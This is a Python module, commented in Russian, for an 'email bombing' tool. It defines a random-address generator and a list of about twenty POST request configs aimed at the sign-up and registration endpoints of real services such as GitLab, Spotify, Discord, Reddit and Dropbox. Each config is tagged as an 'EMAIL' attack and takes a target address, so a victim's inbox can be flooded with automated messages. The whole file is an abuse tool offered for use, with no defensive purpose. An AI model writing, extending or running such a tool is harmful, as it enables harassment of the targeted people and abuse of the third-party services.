"""
Email Bombing — сервисы, которые шлют письма на email.
Используем рандомные email'ы для регистрации/подписки.
"""
import random
import string

def random_email():
    domains = ['gmail.com', 'yandex.ru', 'mail.ru', 'rambler.ru', 'outlook.com', 'icloud.com']
    name = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    return f"{name}@{random.choice(domains)}"

def email_bomb_urls(email=None):
    if not email:
        email = random_email()
    
    return [
        # GitLab — письмо на регистрацию
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'GitLab.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://gitlab.com/users/sign_in',
            'data': {'user[email]': email},
        },
        # Spotify — рассылка
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Spotify.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.spotify.com/api/signup',
            'data': {'email': email},
        },
        # Pinterest
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Pinterest.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.pinterest.com/resource/EmailExistsResource/get/',
            'data': {'email': email},
        },
        # Adobe
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Adobe.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://auth.services.adobe.com/signup/v2/users',
            'data': {'email': email},
        },
        # Canva
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Canva.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.canva.com/api/signup',
            'data': {'email': email},
        },
        # behance
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Behance.net', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.behance.net/v2/register',
            'data': {'email': email},
        },
        # discord
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Discord.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://discord.com/api/v9/auth/register',
            'data': {'email': email},
        },
        # Twitch
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Twitch.tv', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://passport.twitch.tv/register',
            'data': {'email': email},
        },
        # Telegram
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Telegram.org', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://oauth.telegram.org/auth/request',
            'data': {'email': email},
        },
        # Reddit
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Reddit.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.reddit.com/api/register',
            'data': {'email': email},
        },
        # LinkedIn
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'LinkedIn.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.linkedin.com/authwall/register',
            'data': {'email': email},
        },
        # HubSpot
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'HubSpot.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://api.hubspot.com/auth/v1/register',
            'data': {'email': email},
        },
        # Mailchimp
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Mailchimp.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://login.mailchimp.com/signup',
            'data': {'email': email},
        },
        # SendGrid
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'SendGrid.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://sendgrid.com/user/signup',
            'data': {'email': email},
        },
        # Dropbox
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Dropbox.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.dropbox.com/register',
            'data': {'email': email},
        },
        # Evernote
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Evernote.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.evernote.com/Registration.action',
            'data': {'email': email},
        },
        # Trello
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Trello.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://trello.com/signup',
            'data': {'email': email},
        },
        # Medium
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Medium.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://medium.com/m/register',
            'data': {'email': email},
        },
        # Notion
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'Notion.so', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://www.notion.so/api/v3/email/sendSignupEmail',
            'data': {'email': email},
        },
        # WordPress
        {
            'info': {'country': 'ALL', 'attack': 'EMAIL', 'website': 'WordPress.com', 'anonymous': 'No'},
            'method': 'post',
            'url': 'https://wordpress.com/wp-login.php?action=register',
            'data': {'email': email},
        },
    ]
